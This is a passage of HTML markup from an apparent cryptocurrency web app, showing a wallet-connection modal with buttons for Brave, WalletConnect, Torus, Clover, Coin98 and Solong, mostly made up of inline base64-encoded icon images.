yA0MS4yMzQ1IDg1Ljk5NSAzOC44NjQ3IDg2LjQzODhDMzYuNDk0OCA4Ni44ODIzIDMyLjc5NjQgODQuMTk5OCAzMC42Mzc0IDgwLjE4MDhDMjguNjA4IDc2LjQwMjYgMzAuMjAyMSA3Mi42NzQ1IDMxLjQ5MzQgNjkuNjU0MkMzMS41NzU3IDY5LjQ2MTcgMzEuNjU2OCA2OS4yNzIxIDMxLjczNTYgNjkuMDg1NUMzMi45MTM4IDY2LjI5NzUgMzEuMjQzOSA2NC42MTg5IDMwLjExIDYzLjQ3OUMyOS45Nzc1IDYzLjM0NTcgMjkuODUyMiA2My4yMTk5IDI5LjczOTcgNjMuMTAwNEMyOS4xMTY3IDYyLjQzODcgMjYuMDQgNTkuMTcxOSAyMy4xOTE2IDU2LjE0NzVDMjEuMTI4OSA1My45NTczIDE5LjE4NTkgNTEuODk0MyAxOC4zODEyIDUxLjAzOThDMTguMDQ5NCA1MC42ODc1IDE3LjcxNzkgNTAuMzY1MiAxNy4zOTY2IDUwLjA1MjhDMTUuODYyNCA0OC41NjEyIDE0LjU1OTggNDcuMjk0NyAxNC41NTk4IDQ0LjA1ODhDMTQuNTU5OCA0MC4xNDUzIDI5LjcwODQgMjEuODM0MSAyOS43MDg0IDIxLjgzNDFDMjkuNzA4NCAyMS44MzQxIDQyLjQ5MTIgMjQuMjc1NiA0NC4yMTQ4IDI0LjI3NTZDNDUuNTkwMSAyNC4yNzU2IDQ4LjI0NTcgMjMuMzYxMSA1MS4wMTQxIDIyLjQwNzhDNTEuNzE1IDIyLjE2NjUgNTIuNDIzMiAyMS45MjI2IDUzLjExOTYgMjEuNjkwNUM1Ni41NjY3IDIwLjU0MTUgNTguODY0NyAyMC41MzMyIDU4Ljg2NDcgMjAuNTMzMkM1OC44NjQ3IDIwLjUzMzIgNjEuMTYyNyAyMC41NDE1IDY0LjYwOTggMjEuNjkwNUM2NS4zMDYyIDIxLjkyMjYgNjYuMDE0NCAyMi4xNjY1IDY2LjcxNTQgMjIuNDA3OEM2OS40ODM3IDIzLjM2MTEgNzIuMTM5NCAyNC4yNzU2IDczLjUxNDYgMjQuMjc1NlpNNzEuMzIwNiA4OS4wNDQyQzc0LjAyMjggOTAuNDM2NiA3NS45Mzk4IDkxLjQyNDQgNzYuNjY0NiA5MS44Nzc5Qzc3LjYwMjIgOTIuNDY1IDc3LjAzMDMgOTMuNTcxNyA3Ni4xNzYzIDk0LjE3NTVDNzUuMzIyIDk0Ljc3OTMgNjMuODQzIDEwMy42NjcgNjIuNzI5MSAxMDQuNjVDNjIuNTg2NSAxMDQuNzc2IDYyLjQzNTQgMTA0LjkxMiA2Mi4yNzc5IDEwNS4wNTRDNjEuMjA0NSAxMDYuMDIxIDU5LjgzNTMgMTA3LjI1NSA1OC44NjQ2IDEwNy4yNTVDNTcuODkzNiAxMDcuMjU1IDU2LjUyMzUgMTA2LjAyIDU1LjQ1IDEwNS4wNTJDNTUuMjkzIDEwNC45MTEgNTUuMTQyNCAxMDQuNzc1IDU1LjAwMDIgMTA0LjY1QzUzLjg4NiAxMDMuNjY3IDQyLjQwNzMgOTQuNzc5MyA0MS41NTMgOTQuMTc1NUM0MC42OTg3IDkzLjU3MTcgNDAuMTI3MSA5Mi40NjUgNDEuMDY0NyA5MS44Nzc5QzQxLjc5IDkxLjQyNDEgNDMuNzA4OCA5MC40MzU0IDQ2LjQxMzcgODkuMDQxN0M0Ny4yMDY2IDg4LjYzMzIgNDguMDY2OSA4OC4xODk5IDQ4Ljk4NDYgODcuNzE1QzUzLjAzMjIgODUuNjIwNSA1OC4wNzczIDgzLjgzOTcgNTguODY0NiA4My44Mzk3QzU5LjY1MiA4My44Mzk3IDY0LjY5NjggODUuNjIwNSA2OC43NDUgODcuNzE1QzY5LjY2NDUgODguMTkwOCA3MC41MjY0IDg4LjYzNSA3MS4zMjA2IDg5LjA0NDJaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTkxLjMyNDMgMTMuMzYwN0w3OS41NDY5IDBINTguODY0NkgzOC4xODIzTDI2LjQwNDkgMTMuMzYwN0MyNi40MDQ5IDEzLjM2MDcgMTYuMDYzNyAxMC40ODg0IDExLjE4MDQgMTUuMzcxM0MxMS4xODA0IDE1LjM3MTMgMjQuOTY4NiAxNC4xMjY3IDI5LjcwODMgMjEuODM0MUMyOS43MDgzIDIxLjgzNDEgNDIuNDkxMSAyNC4yNzU2IDQ0LjIxNDYgMjQuMjc1NkM0NS45MzgxIDI0LjI3NTYgNDkuNjcyNCAyMi44Mzk0IDUzLjExOTUgMjEuNjkwNUM1Ni41NjY1IDIwLjU0MTUgNTguODY0NiAyMC41MzMyIDU4Ljg2NDYgMjAuNTMzMkM1OC44NjQ2IDIwLjUzMzIgNjEuMTYyNiAyMC41NDE1IDY0LjYwOTYgMjEuNjkwNUM2OC4wNTY3IDIyLjgzOTQgNzEuNzkxIDI0LjI3NTYgNzMuNTE0NSAyNC4yNzU2Qzc1LjIzOCAyNC4yNzU2IDg4LjAyMDggMjEuODM0MSA4OC4wMjA4IDIxLjgzNDFDOTIuNzYwNSAxNC4xMjY3IDEwNi41NDkgMTUuMzcxMyAxMDYuNTQ5IDE1LjM3MTNDMTAxLjY2NSAxMC40ODg0IDkxLjMyNDMgMTMuMzYwNyA5MS4zMjQzIDEzLjM2MDdaIiBmaWxsPSJ1cmwoI3BhaW50MV9saW5lYXIpIi8+CjxtYXNrIGlkPSJtYXNrMCIgbWFzay10eXBlPSJhbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMTEiIHk9IjAiIHdpZHRoPSI5NiIgaGVpZ2h0PSIyNSI+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNOTEuMzI0MyAxMy4zNjA3TDc5LjU0NjkgMEg1OC44NjQ2SDM4LjE4MjNMMjYuNDA0OSAxMy4zNjA3QzI2LjQwNDkgMTMuMzYwNyAxNi4wNjM3IDEwLjQ4ODQgMTEuMTgwNCAxNS4zNzEzQzExLjE4MDQgMTUuMzcxMyAyNC45Njg2IDE0LjEyNjcgMjkuNzA4MyAyMS44MzQxQzI5LjcwODMgMjEuODM0MSA0Mi40OTExIDI0LjI3NTYgNDQuMjE0NiAyNC4yNzU2QzQ1LjkzODEgMjQuMjc1NiA0OS42NzI0IDIyLjgzOTQgNTMuMTE5NSAyMS42OTA1QzU2LjU2NjUgMjAuNTQxNSA1OC44NjQ2IDIwLjUzMzIgNTguODY0NiAyMC41MzMyQzU4Ljg2NDYgMjAuNTMzMiA2MS4xNjI2IDIwLjU0MTUgNjQuNjA5NiAyMS42OTA1QzY4LjA1NjcgMjIuODM5NCA3MS43OTEgMjQuMjc1NiA3My41MTQ1IDI0LjI3NTZDNzUuMjM4IDI0LjI3NTYgODguMDIwOCAyMS44MzQxIDg4LjAyMDggMjEuODM0MUM5Mi43NjA1IDE0LjEyNjcgMTA2LjU0OSAxNS4zNzEzIDEwNi41NDkgMTUuMzcxM0MxMDEuNjY1IDEwLjQ4ODQgOTEuMzI0MyAxMy4zNjA3IDkxLjMyNDMgMTMuMzYwN1oiIGZpbGw9IndoaXRlIi8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMCkiPgo8L2c+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXIiIHgxPSIxLjQxMzgyIiB5MT0iMTM1LjY3MiIgeDI9IjExNi4zMTUiIHkyPSIxMzUuNjcyIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNGRjU1MDAiLz4KPHN0b3Agb2Zmc2V0PSIwLjQwOTg3NyIgc3RvcC1jb2xvcj0iI0ZGNTUwMCIvPgo8c3RvcCBvZmZzZXQ9IjAuNTgxOTgxIiBzdG9wLWNvbG9yPSIjRkYyMDAwIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0ZGMjAwMCIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MV9saW5lYXIiIHgxPSIxMy4yMjkzIiB5MT0iMjQuMTg2MSIgeDI9IjEwNi41NDkiIHkyPSIyNC4xODYxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNGRjQ1MkEiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRkYyMDAwIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg==" alt="Brave icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Brave</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'walletconnect\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="WalletConnect">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjE4NSIgdmlld0JveD0iMCAwIDMwMCAxODUiIHdpZHRoPSIzMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0ibTYxLjQzODU0MjkgMzYuMjU2MjYxMmM0OC45MTEyMjQxLTQ3Ljg4ODE2NjMgMTI4LjIxMTk4NzEtNDcuODg4MTY2MyAxNzcuMTIzMjA5MSAwbDUuODg2NTQ1IDUuNzYzNDE3NGMyLjQ0NTU2MSAyLjM5NDQwODEgMi40NDU1NjEgNi4yNzY1MTEyIDAgOC42NzA5MjA0bC0yMC4xMzY2OTUgMTkuNzE1NTAzYy0xLjIyMjc4MSAxLjE5NzIwNTEtMy4yMDUzIDEuMTk3MjA1MS00LjQyODA4MSAwbC04LjEwMDU4NC03LjkzMTE0NzljLTM0LjEyMTY5Mi0zMy40MDc5ODE3LTg5LjQ0Mzg4Ni0zMy40MDc5ODE3LTEyMy41NjU1Nzg4IDBsLTguNjc1MDU2MiA4LjQ5MzYwNTFjLTEuMjIyNzgxNiAxLjE5NzIwNDEtMy4yMDUzMDEgMS4xOTcyMDQxLTQuNDI4MDgwNiAwbC0yMC4xMzY2OTQ5LTE5LjcxNTUwMzFjLTIuNDQ1NTYxMi0yLjM5NDQwOTItMi40NDU1NjEyLTYuMjc2NTEyMiAwLTguNjcwOTIwNHptMjE4Ljc2Nzc5NjEgNDAuNzczNzQ0OSAxNy45MjE2OTcgMTcuNTQ2ODk3YzIuNDQ1NTQ5IDIuMzk0Mzk2OSAyLjQ0NTU2MyA2LjI3NjQ3NjkuMDAwMDMxIDguNjcwODg5OWwtODAuODEwMTcxIDc5LjEyMTEzNGMtMi40NDU1NDQgMi4zOTQ0MjYtNi40MTA1ODIgMi4zOTQ0NTMtOC44NTYxNi4wMDAwNjItLjAwMDAxLS4wMDAwMS0uMDAwMDIyLS4wMDAwMjItLjAwMDAzMi0uMDAwMDMybC01Ny4zNTQxNDMtNTYuMTU0NTcyYy0uNjExMzktLjU5ODYwMi0xLjYwMjY1LS41OTg2MDItMi4yMTQwNCAwLS4wMDAwMDQuMDAwMDA0LS4wMDAwMDcuMDAwMDA4LS4wMDAwMTEuMDAwMDExbC01Ny4zNTI5MjEyIDU2LjE1NDUzMWMtMi40NDU1MzY4IDIuMzk0NDMyLTYuNDEwNTc1NSAyLjM5NDQ3Mi04Ljg1NjE2MTIuMDAwMDg3LS4wMDAwMTQzLS4wMDAwMTQtLjAwMDAyOTYtLjAwMDAyOC0uMDAwMDQ0OS0uMDAwMDQ0bC04MC44MTI0MTk0My03OS4xMjIxODVjLTIuNDQ1NTYwMjEtMi4zOTQ0MDgtMi40NDU1NjAyMS02LjI3NjUxMTUgMC04LjY3MDkxOTdsMTcuOTIxNzI5NjMtMTcuNTQ2ODY3M2MyLjQ0NTU2MDItMi4zOTQ0MDgyIDYuNDEwNTk4OS0yLjM5NDQwODIgOC44NTYxNjAyIDBsNTcuMzU0OTc3NSA1Ni4xNTUzNTdjLjYxMTM5MDguNTk4NjAyIDEuNjAyNjQ5LjU5ODYwMiAyLjIxNDAzOTggMCAuMDAwMDA5Mi0uMDAwMDA5LjAwMDAxNzQtLjAwMDAxNy4wMDAwMjY1LS4wMDAwMjRsNTcuMzUyMTAzMS01Ni4xNTUzMzNjMi40NDU1MDUtMi4zOTQ0NjMzIDYuNDEwNTQ0LTIuMzk0NTUzMSA4Ljg1NjE2MS0uMDAwMi4wMDAwMzQuMDAwMDMzNi4wMDAwNjguMDAwMDY3My4wMDAxMDEuMDAwMTAxbDU3LjM1NDkwMiA1Ni4xNTU0MzJjLjYxMTM5LjU5ODYwMSAxLjYwMjY1LjU5ODYwMSAyLjIxNDA0IDBsNTcuMzUzOTc1LTU2LjE1NDMyNDljMi40NDU1NjEtMi4zOTQ0MDkyIDYuNDEwNTk5LTIuMzk0NDA5MiA4Ljg1NjE2IDB6IiBmaWxsPSIjM2I5OWZjIi8+PC9zdmc+" alt="WalletConnect icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">WalletConnect</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'torus\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Torus">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzMiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMyAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYuNSIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzAzNjRGRiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTExLjIxODYgOS40OTIxOUMxMC40NTM5IDkuNDkyMTkgOS44MzM5OCAxMC4xMTIxIDkuODMzOTggMTAuODc2OFYxMi40ODk4QzkuODMzOTggMTMuMjU0NSAxMC40NTM5IDEzLjg3NDQgMTEuMjE4NiAxMy44NzQ0SDEzLjY2ODRWMjIuODk3NkMxMy42Njg0IDIzLjY2MjMgMTQuMjg4MyAyNC4yODIyIDE1LjA1MyAyNC4yODIySDE2LjY2NkMxNy40MzA3IDI0LjI4MjIgMTguMDUwNiAyMy42NjIzIDE4LjA1MDYgMjIuODk3NlYxMi41MDE1QzE4LjA1MDYgMTIuNDk3NiAxOC4wNTA2IDEyLjQ5MzcgMTguMDUwNiAxMi40ODk4VjEwLjg3NjhDMTguMDUwNiAxMC4xMTIxIDE3LjQzMDcgOS40OTIxOSAxNi42NjYgOS40OTIxOUgxNS4wNTNIMTEuMjE4NloiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0yMS4zMzc2IDEzLjg3NDRDMjIuNTQ3NyAxMy44NzQ0IDIzLjUyODcgMTIuODkzNCAyMy41Mjg3IDExLjY4MzNDMjMuNTI4NyAxMC40NzMyIDIyLjU0NzcgOS40OTIxOSAyMS4zMzc2IDkuNDkyMTlDMjAuMTI3NSA5LjQ5MjE5IDE5LjE0NjUgMTAuNDczMiAxOS4xNDY1IDExLjY4MzNDMTkuMTQ2NSAxMi44OTM0IDIwLjEyNzUgMTMuODc0NCAyMS4zMzc2IDEzLjg3NDRaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="Torus icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Torus</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'clover\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Clover">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM2LjQ4IDBIMTEuNTJDNS4xNTc2OCAwIDAgNS4xNTc2OCAwIDExLjUyVjM2LjQ4QzAgNDIuODQyMyA1LjE1NzY4IDQ4IDExLjUyIDQ4SDM2LjQ4QzQyLjg0MjMgNDggNDggNDIuODQyMyA0OCAzNi40OFYxMS41MkM0OCA1LjE1NzY4IDQyLjg0MjMgMCAzNi40OCAwWiIgZmlsbD0idXJsKCNwYWludDBfbGluZWFyXzc5MTBfMTYzMzUxKSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTI0LjAwMDYgMzkuMzYwNkMzMi40ODM3IDM5LjM2MDYgMzkuMzYwNiAzMi40ODM3IDM5LjM2MDYgMjQuMDAwNkMzOS4zNjA2IDE1LjUxNzUgMzIuNDgzNyA4LjY0MDYyIDI0LjAwMDYgOC42NDA2MkMxNS41MTc1IDguNjQwNjIgOC42NDA2MiAxNS41MTc1IDguNjQwNjIgMjQuMDAwNkM4LjY0MDYyIDMyLjQ4MzcgMTUuNTE3NSAzOS4zNjA2IDI0LjAwMDYgMzkuMzYwNlpNMjEuMjg5OSAxNS44Njg4SDI2LjcxMVYyMS4zNDdIMjEuMjkwNFYyNi42NTRIMjYuNzExVjMyLjEzMjJIMjEuMjg5OVYyNi44MjUySDE1Ljg2OTNWMjEuMzQ3SDIxLjI4OTlWMTUuODY4OFpNMjYuNzEyIDIxLjM0N0gzMi4xMzMxVjI2LjgyNTJIMjYuNzEyVjIxLjM0N1oiIGZpbGw9ImJsYWNrIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfNzkxMF8xNjMzNTEiIHgxPSI0OCIgeTE9Ii0xLjQzMDUxZS0wNiIgeDI9IjEuNDMwNTFlLTA2IiB5Mj0iNDgiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iI0E5RkZFMCIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4NkQ1RkYiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8L3N2Zz4=" alt="Clover icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Clover</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'coin98\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Coin98">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3NiA3NSI+CiAgPGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImEiIHgxPSIxMDEuNjgxJSIgeDI9Ii0xLjU1NyUiIHkxPSIxNS4yNjglIiB5Mj0iODQuOTE3JSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNGMUQ5NjEiLz4KICAgICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjQ0RBMTQ2Ii8+CiAgICA8L2xpbmVhckdyYWRpZW50PgogIDwvZGVmcz4KICA8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgPHJlY3Qgd2lkdGg9Ijc1IiBoZWlnaHQ9Ijc1IiBmaWxsPSIjMDAwIiByeD0iMTYiLz4KICAgIDxwYXRoIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0ibm9uemVybyIgZD0iTTYxLjQ0IDBhMTMuNzE0IDEzLjcxNCAwIDAgMSA5LjY4IDQuMDEgMTMuNjYxIDEzLjY2MSAwIDAgMSA0LjAwOCA5LjY2OHY0Ny42NDZhMTMuNjYgMTMuNjYgMCAwIDEtNC4wMDcgOS42NjZBMTMuNzEzIDEzLjcxMyAwIDAgMSA2MS40NCA3NUgxMy42ODZhMTMuNzEzIDEzLjcxMyAwIDAgMS05LjY4LTQuMDFBMTMuNjYgMTMuNjYgMCAwIDEgMCA2MS4zMjRWMTMuNjc4YzAtMy42MjUgMS40NC03LjEwMiA0LjAwNy05LjY2N0ExMy43MTQgMTMuNzE0IDAgMCAxIDEzLjY4NyAwWk0yMC4wNjMgNDYuMjMxaC00LjgyNWExMC4wMzIgMTAuMDMyIDAgMCAwIDIuOTQ2IDcuMDg2IDEwLjA3IDEwLjA3IDAgMCAwIDcuMSAyLjk0MiAxMC4wNjUgMTAuMDY1IDAgMCAwIDcuMTA4LTIuOTM1IDEwLjAzIDEwLjAzIDAgMCAwIDIuOTQ2LTcuMDkzaC00LjgyNGE1LjIwNyA1LjIwNyAwIDAgMS0xLjUzIDMuNjg4IDUuMjI1IDUuMjI1IDAgMCAxLTMuNjk2IDEuNTI4IDUuMjM0IDUuMjM0IDAgMCAxLTMuNjk1LTEuNTI4IDUuMjEzIDUuMjEzIDAgMCAxLTEuNTMtMy42ODhaTTU0LjMzIDMzLjcxNmExMS43NjMgMTEuNzYzIDAgMCAwLTEyLjc5OSAyLjUzOEExMS42OTcgMTEuNjk3IDAgMCAwIDM4Ljk5IDQ5LjAzYTExLjcyMyAxMS43MjMgMCAwIDAgNC4zMjggNS4yNTkgMTEuNzU3IDExLjc1NyAwIDAgMCA2LjUyNiAxLjk3IDExLjc2NiAxMS43NjYgMCAwIDAgOC4yOS0zLjQzNSAxMS43MiAxMS43MiAwIDAgMCAzLjQ0Mi04LjI3NCAxMS43MDIgMTEuNzAyIDAgMCAwLTEuOTc1LTYuNTE0IDExLjczNiAxMS43MzYgMCAwIDAtNS4yNjktNC4zMlptLTQuNDg4IDMuOTJhNi45MzcgNi45MzcgMCAwIDEgNC45IDIuMDI1IDYuOTEgNi45MSAwIDAgMSAyLjAyOCA0Ljg5MiA2Ljg5NyA2Ljg5NyAwIDAgMS0xLjE3IDMuODM0IDYuOTMyIDYuOTMyIDAgMCAxLTEwLjY0MyAxLjA0MiA2LjkwMiA2LjkwMiAwIDAgMS0xLjUtNy41MjIgNi45MDkgNi45MDkgMCAwIDEgMi41NDQtMy4xIDYuOTI4IDYuOTI4IDAgMCAxIDMuODQxLTEuMTY3Wm0uMTcgNC41NTJhMi40MzEgMi40MzEgMCAwIDAtMi4yNDEgMS4xNTQgMi40MTggMi40MTggMCAwIDAtLjM1NiAxLjI1NyAyLjM5NSAyLjM5NSAwIDAgMCAxLjYxOSAyLjI5djEuNzUzaDEuNjE4di0xLjc1NGEyLjQyNyAyLjQyNyAwIDAgMCAxLjU5NC0xLjk1IDIuNDE4IDIuNDE4IDAgMCAwLTEtMi4zMSAyLjQzMSAyLjQzMSAwIDAgMC0xLjIzNC0uNDRabS0yMC4yMi0yMi41NTJhMTEuNzYyIDExLjc2MiAwIDAgMC0xMi43OTYgMi41MzEgMTEuNjk3IDExLjY5NyAwIDAgMC0yLjU1NCAxMi43NjkgMTEuNzIzIDExLjcyMyAwIDAgMCA0LjMyIDUuMjYyIDExLjc1NyAxMS43NTcgMCAwIDAgMTQuODI1LTEuNDQ2IDExLjcxNyAxMS43MTcgMCAwIDAgMy40NDUtOC4yODQgMTEuNzAzIDExLjcwMyAwIDAgMC0xLjk3NC02LjUxMiAxMS43MzYgMTEuNzM2IDAgMCAwLTUuMjY2LTQuMzJabS00LjUxIDMuOTE3YTYuOTQ1IDYuOTQ1IDAgMCAxIDQuODk3IDIuMDI5IDYuOTE4IDYuOTE4IDAgMCAxIDIuMDMyIDQuODg2IDYuOTA2IDYuOTA2IDAgMCAxLTEuMTY4IDMuODQyIDYuOTQgNi45NCAwIDAgMS0xMC42NiAxLjA0OCA2LjkxMSA2LjkxMSAwIDAgMS0xLjUtNy41MzYgNi45MTggNi45MTggMCAwIDEgMi41NS0zLjEwMyA2LjkzNyA2LjkzNyAwIDAgMSAzLjg1LTEuMTY2Wm0yNC41Ni00LjgxYTEwLjA1OSAxMC4wNTkgMCAwIDAtNy4xMDMgMi45NCAxMC4wMiAxMC4wMiAwIDAgMC0yLjk0IDcuMDkgOS45IDkuOSAwIDAgMCAxLjIzIDQuNzk1IDEzLjU3NSAxMy41NzUgMCAwIDEgNC4yMTQtMi4zMjIgNS4wODIgNS4wODIgMCAwIDEtLjYyNS0yLjQ3NyA1LjIwNiA1LjIwNiAwIDAgMSAxLjUwMy0zLjczNiA1LjIyMyA1LjIyMyAwIDAgMSAzLjcyMi0xLjU1NCA1LjIzNCA1LjIzNCAwIDAgMSAzLjcyIDEuNTU0IDUuMjEzIDUuMjEzIDAgMCAxIDEuNTA1IDMuNzM2IDUuMjc5IDUuMjc5IDAgMCAxLS42MjMgMi40NzMgMTMuNTc0IDEzLjU3NCAwIDAgMSA0LjIxMyAyLjMyMiA5LjkwMyA5LjkwMyAwIDAgMCAxLjIzLTQuNzk1IDEwLjAzMiAxMC4wMzIgMCAwIDAtMi45NDYtNy4wODYgMTAuMDcgMTAuMDcgMCAwIDAtNy4xLTIuOTRabS0yMy43NSA3Ljk5aC0xLjYxN3YxLjc1YTIuNDE5IDIuNDE5IDAgMCAwLTEuNTgyIDIuNjg3IDIuNDE0IDIuNDE0IDAgMCAwIDIuMzkgMi4wMDYgMi40NSAyLjQ1IDAgMCAwIDEuNTU1LS41NzQgMi40MTQgMi40MTQgMCAwIDAtLjc0Ni00LjExOXYtMS43NVoiLz4KICA8L2c+Cjwvc3ZnPgo=" alt="Coin98 icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Coin98</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'solong\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Solong">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAYAAACOEfKtAAAGlklEQVR4Ae3bA5DsyhfH8TNr49r2/du2bdu2bdu2zcdNrm3b9toz533rvctUn3Umk9p01WfdvVW/6nROBxJVS1rSkpa0pCUtaUlLWtKSpl4VXos3GJ4sujQFuUKfWl+qT730arzB8Ex9YksKcgXjFOCVeIPhBYydB8mawQ+yiGC8n0EN6zAVcgXhpQjoq1DDdsyDAAB9Pwo1HMC9INk0FIM8Bt1Qh9WohQQCvD+BtEMdtmC8I7y5aIE67MV0SBwDvB3qsE/UHwMJIpC/QB1OYiLEEeCPoQ7nMRcSwwDrao3Zl8aTIEGEUYlL0IAMXuQOr66UvsegDm+ExDJAPNiafSg0AlyIbmjAWX1aQzEkiH6T0QkNaEdpnAN8NNRhPcSF9e9el2ebBhyAuNBvGtLQgIuQOAd4D6jDMRQbM3AmOqEBDfq0xjJIEP3GohkakEFVjAP0y401sAsLnAE+pb6EsC5AA9J4sHsG+kX0PQR1eFJ8AwTWQh0+DjFm4a1Qh2/AOoz/BHX4ZdwD/CDU4aioX2GUMW+AOnB2bqiBBDHe86EOTYw5GRKJwQ/ijUM91OGTxgysxSmowzeNw7j08m5DHX4l7Igg2TY0g9hbLBZ+f7oxC98CdWjDvYzD+MVQh07GfEQsZyDgVWA71OGvorfnQQCAcqaYUFZDHW6j/itAoB70GcergzqsEa0rhGTTEA7mP0koK4xdyeOMmvBBhJU2zsjPMw7lu9O3zShpXheHk4hhcZ4w26AOG4RSxDiUfwZ12KdPqy+FBDHeV6EOZxizIg6HsMGbiQ5jdjzBXRfeefGg3tgbv9BYC0fhZE7sjUMY9Pf9rdcI5XtQh39BjBA/C3VYnM0zc